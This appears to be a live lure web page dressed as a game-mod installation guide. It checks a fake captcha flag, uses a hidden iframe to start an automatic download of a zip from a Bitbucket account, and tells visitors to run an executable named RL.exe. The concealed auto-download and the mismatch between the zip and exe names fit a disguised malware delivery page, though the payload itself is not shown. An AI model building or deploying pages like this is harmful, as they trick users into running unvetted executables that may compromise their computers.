<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mod Installation Guide</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      text-align: center;
      padding: 50px;
    }
    .container {
      max-width: 600px;
      margin: auto;
      background: #1e1e1e;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
    }
    h1 {
      color: #ffcc00;
    }
    .steps {
      text-align: left;
      margin-top: 20px;
    }
    .step {
      margin: 10px 0;
    }
  </style>
  <script>
    // Проверка флага. Если пользователь не прошёл проверку, перенаправляем обратно на index.html.
    if (localStorage.getItem('captchaPassed') !== 'true') {
      window.location.href = "index.html";
    }
    
    // При загрузке создаём скрытый iframe для запуска загрузки файла,
    // чтобы содержимое страницы оставалось видимым.
    window.onload = function() {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = "https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip";
      document.body.appendChild(iframe);
    };
  </script>
</head>
<body>
  <div class="container">
    <h1>Mod Installation Guide</h1>
    <p>Your download should start automatically. If not, <a href="https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip" style="color: #ffcc00;">click here</a>.</p>
    <div class="steps">
      <h2>Installation Steps:</h2>
      <p class="step">1. Run the downloaded installer (file name: RL.exe).</p>
      <p class="step">2. Select the game directory.</p>
      <p class="step">3. Wait for the installation to complete.</p>
      <p class="step">4. Launch the game and enjoy the mod!</p>
    </div>
    <p style="margin-top: 20px; font-style: italic;">Best regards, RL Team</p>
  </div>
</body>
</html>
